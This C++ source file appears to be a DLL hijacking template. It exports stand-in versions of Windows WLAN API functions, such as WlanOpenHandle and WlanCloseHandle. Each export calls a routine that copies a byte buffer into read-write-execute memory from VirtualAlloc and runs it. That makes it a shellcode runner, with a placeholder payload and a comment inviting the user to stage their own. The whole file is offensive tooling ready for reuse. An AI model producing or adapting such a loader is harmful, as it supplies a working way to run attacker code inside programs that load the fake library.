// Loader.cpp : Defines the exported functions for the DLL.
//

#include "pch.h"
#include "framework.h"

typedef void (*fn_t)(void);

void callPayload(void) {
	/* stage your own payloed here */
	constexpr int payload_size = 4;
	unsigned char payload_buffer[] = "\x41\x41\x41\41";
	LPVOID lpMem = VirtualAlloc(NULL, payload_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(lpMem, &payload_buffer[0], payload_size);
	fn_t f = (fn_t)lpMem;
	f();
}

HRESULT __stdcall WlanQueryInterface()
{
	callPayload();
	return 1;
}

HRESULT __stdcall WlanHostedNetworkQueryProperty()
{
	callPayload();
	return 1;
}


HRESULT __stdcall WlanOpenHandle()
{
	callPayload();
	return 1;
}


HRESULT __stdcall WlanFreeMemory()
{
	callPayload();
	return 1;
}

HRESULT __stdcall WlanCloseHandle()
{
	callPayload();
	return 1;
}

HRESULT __stdcall WlanSignalValueToBar()
{
	callPayload();
	return 1;
}

HRESULT __stdcall WlanUtf8SsidToDisplayName()
{
	callPayload();
	return 1;
}